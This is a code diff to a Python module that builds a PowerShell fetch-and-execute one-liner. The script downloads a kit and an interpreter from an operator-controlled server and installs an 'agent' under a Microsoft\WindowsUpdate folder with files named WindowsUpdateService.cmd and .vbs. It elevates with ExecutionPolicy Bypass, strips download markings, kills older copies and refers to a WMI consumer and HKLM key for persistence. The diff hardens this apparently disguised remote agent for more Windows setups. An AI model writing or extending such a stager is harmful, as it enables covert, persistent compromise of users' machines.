@@ -1,5 +1,23 @@
-"""The one-liner served at /wu.  Survives: no Python, no admin, no PS7,
-restricted ExecutionPolicy, flaky TLS, 32-bit Windows, proxy, re-install."""
+"""The one-liner served at ``/wu``.
+
+Hard constraints, in priority order:
+
+1. ``irm <base>/wu | iex`` MUST parse.  That means no top-level ``param()``:
+   PowerShell requires param() to be the first statement of a script block, and
+   iex compiles the string as one.  A bare assignment before param() throws
+   "the param statement must be the first statement in a script block".
+   The body therefore lives in a function; the last line calls it.
+
+2. Must survive: no Python, no admin, UAC declined, PowerShell 5.1 only,
+   Restricted ExecutionPolicy, a proxy, TLS interception, 32-bit Windows,
+   ARM64 Windows, no %LOCALAPPDATA% (SYSTEM context), and a re-run over a
+   running agent.
+
+3. The elevated re-invocation must keep the ORIGINAL user's target path.
+   Start-Process -Verb RunAs runs as the admin account, whose %LOCALAPPDATA%
+   is a different profile.  The server bakes @@TARGET@@ from the query string
+   instead of passing a parameter.
+"""
 
 from __future__ import annotations
 
@@ -8,6 +26,7 @@ from .. import config
 
 TEMPLATE = r'''
 function Install-SysPy {
+
 $ErrorActionPreference = 'Stop'
 $ProgressPreference    = 'SilentlyContinue'
 
@@ -19,13 +38,12 @@ $salt    = '@@SALT@@'
 $embed   = '@@EMBED@@'
 $protect = @@PROTECT@@
 $elevate = @@ELEVATE@@
+$target  = '@@TARGET@@'
 
-$arch = 'amd64'
-try { if (-not [Environment]::Is64BitOperatingSystem) { $arch = 'win32' } } catch {}
+function Say([string]$m)  { Write-Host "  $m" }
+function Warn([string]$m) { Write-Host "  [!] $m" }
 
-function Say([string]$m) { Write-Host "  $m" }
 try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
-try { [Net.WebRequest]::DefaultWebProxy = [Net.WebRequest]::GetSystemWebProxy() } catch {}
 
 function Test-Admin {
     try {
@@ -38,9 +56,12 @@ function Test-Admin {
 function Fetch([string]$url, [string]$out) {
     for ($i = 1; $i -le 3; $i++) {
         try {
-            try { Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -TimeoutSec 180 }
+            try   { Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -TimeoutSec 180 }
             catch { (New-Object Net.WebClient).DownloadFile($url, $out) }
-            if ((Test-Path $out) -and ((Get-Item $out).Length -gt 1024)) { return $true }
+            if ((Test-Path $out) -and ((Get-Item $out).Length -gt 1024)) {
+                try { Unblock-File $out } catch {}
+                return $true
+            }
         } catch { Start-Sleep -Seconds (2 * $i) }
     }
     $false
@@ -48,14 +69,17 @@ function Fetch([string]$url, [string]$out) {
 
 function Stop-OldAgent {
     try {
-        Get-CimInstance Win32_Process -Filter "Name='pythonw.exe' OR Name='python.exe'" -ErrorAction SilentlyContinue |
-            Where-Object { $_.CommandLine -like '*WindowsUpdate*' -and $_.CommandLine -notlike '*--purge*' } |
-            ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
+        Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
+            $_.Name -match '^(python|pythonw|py|pyw)\.exe$' -and
+            $_.CommandLine -like '*WindowsUpdate*' -and
+            $_.CommandLine -notlike '*--purge*'
+        } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
     } catch {}
-    Start-Sleep -Milliseconds 500
+    Start-Sleep -Milliseconds 600
 }
 
-function Resolve-Target {
+function Resolve-Target([string]$wanted) {
+    if ($wanted -and $wanted.Trim()) { return $wanted.Trim() }
     $c = @()
     if ($env:LOCALAPPDATA) { $c += (Join-Path $env:LOCALAPPDATA 'Microsoft\WindowsUpdate') }
     if ($env:APPDATA)      { $c += (Join-Path $env:APPDATA      'Microsoft\WindowsUpdate') }
@@ -73,27 +97,34 @@ function Resolve-Target {
     throw 'no writable install directory'
 }
 
-# ---------------------------------------------------------------- elevate once
+# ---------------------------------------------------------------- arch
+$arch = 'amd64'
+try {
+    if (-not [Environment]::Is64BitOperatingSystem) { $arch = 'win32' }
+    elseif ($env:PROCESSOR_ARCHITECTURE -eq 'ARM64') { $arch = 'arm64' }
+} catch {}
+
+# ------------------------------------------------- resolve target, then elevate
+if (-not $target) { $target = Resolve-Target '' }
+
 if ($elevate -and -not (Test-Admin)) {
+    $q = "irm '$base/wu?elevate=0&target=$([uri]::EscapeDataString($target))' | iex"
     try {
-        $tmp = Join-Path $env:TEMP 'wu-elevated.ps1'
-        if (Fetch "$base/wu?elevate=0&arch=$arch" $tmp) {
-            Start-Process -FilePath 'powershell.exe' -Verb RunAs -Wait -ArgumentList @(
-                '-NoProfile','-ExecutionPolicy','Bypass','-File', $tmp)
-            if (Test-Path (Join-Path $env:LOCALAPPDATA 'Microsoft\WindowsUpdate\agent.py')) {
-                Say 'installed (elevated)'
-                return
-            }
-        }
-    } catch { Say 'elevation declined - continuing user-level' }
+        Start-Process -FilePath 'powershell.exe' -Verb RunAs -Wait -ArgumentList @(
+            '-NoProfile','-ExecutionPolicy','Bypass','-Command', $q)
+        if (Test-Path (Join-Path $target 'agent.py')) { Say 'installed (elevated)'; return }
+        Warn 'elevated run finished but no agent.py - continuing user-level'
+    } catch {
+        Warn 'UAC declined - installing USER-LEVEL: no WMI consumer, no HKLM key'
+        Warn 'run again from an Administrator PowerShell for full protection'
+    }
 }
 
-$target = Resolve-Target
+New-Item -ItemType Directory -Force -Path $target | Out-Null
 Say "target: $target"
-
 Stop-OldAgent
 
-# ---------------------------------------------------------------- stage bundle
+# ---------------------------------------------------------------- stage
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 $kit   = Join-Path $env:TEMP 'wu-kit.zip'
 $stage = Join-Path $env:TEMP ('wu-stage-' + [guid]::NewGuid().ToString('N').Substring(0,8))
@@ -106,11 +137,9 @@ New-Item -ItemType Directory -Force -Path $stage | Out-Null
 
 foreach ($owned in 'syspy','install','agent.py','bootstrap.py') {
     $dst = Join-Path $target $owned
-    for ($try = 1; $try -le 5; $try++) {
-        try {
-            if (Test-Path $dst) { Remove-Item $dst -Recurse -Force -ErrorAction Stop }
-            break
-        } catch { Start-Sleep -Milliseconds 400 }
+    for ($t = 1; $t -le 5; $t++) {
+        try { if (Test-Path $dst) { Remove-Item $dst -Recurse -Force -ErrorAction Stop }; break }
+        catch { Start-Sleep -Milliseconds 400 }
     }
     $src = Join-Path $stage $owned
     if (Test-Path $src) { Move-Item $src $dst -Force }
@@ -118,8 +147,11 @@ foreach ($owned in 'syspy','install','agent.py','bootstrap.py') {
 Copy-Item $kit (Join-Path $target 'kit.zip') -Force
 Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
 
-$shim = Join-Path $target 'install\wu.cmd'
-if (Test-Path $shim) { Copy-Item $shim (Join-Path $target 'WindowsUpdateService.cmd') -Force }
+foreach ($pair in @(@('install\wu.cmd','WindowsUpdateService.cmd'),
+                    @('install\wu.vbs','WindowsUpdateService.vbs'))) {
+    $s = Join-Path $target $pair[0]
+    if (Test-Path $s) { Copy-Item $s (Join-Path $target $pair[1]) -Force }
+}
 
 # ---------------------------------------------------------------- deploy.json
 $deploy = [ordered]@{
@@ -158,11 +190,12 @@ function Resolve-Python {
 
 $py = Resolve-Python
 if (-not $py) {
-    Say 'no Python found - fetching a private interpreter'
+    Say "no Python found - fetching a private interpreter ($arch)"
     $rt  = Join-Path $target 'runtime'
     $tmp = Join-Path $env:TEMP 'wu-py.zip'
     $ok  = Fetch "$base/wu/py.zip?arch=$arch" $tmp
-    if (-not $ok -and $arch -eq 'amd64') {
+    if (-not $ok -and $arch -ne 'amd64') { $ok = Fetch "$base/wu/py.zip?arch=amd64" $tmp }
+    if (-not $ok) {
         $ok = Fetch "https://www.python.org/ftp/python/$embed/python-$embed-embed-amd64.zip" $tmp
     }
     if (-not $ok) { throw 'cannot obtain an interpreter' }
@@ -206,13 +239,16 @@ Install-SysPy
 
 
 def render(base: str = "", room: str = "", passphrase: str = "", group: str = "",
-           salt: str = "", protect: bool = True, elevate: bool = True) -> str:
+           salt: str = "", target: str = "", protect: bool = True,
+           elevate: bool = True) -> str:
+    """Return the installer script with the deployment baked in."""
     return (TEMPLATE
             .replace("@@BASE@@", (base or config.PUBLIC_URL).rstrip("/"))
             .replace("@@ROOM@@", room or config.ROOM)
             .replace("@@PASS@@", passphrase or config.PASSPHRASE)
             .replace("@@GROUP@@", group)
             .replace("@@SALT@@", salt or secrets.token_hex(4))
+            .replace("@@TARGET@@", target.replace("'", "''"))
             .replace("@@EMBED@@", getattr(config, "EMBED_VERSION", "3.12.8"))
             .replace("@@PROTECT@@", "$true" if protect else "$false")
             .replace("@@ELEVATE@@", "$true" if elevate else "$false"))
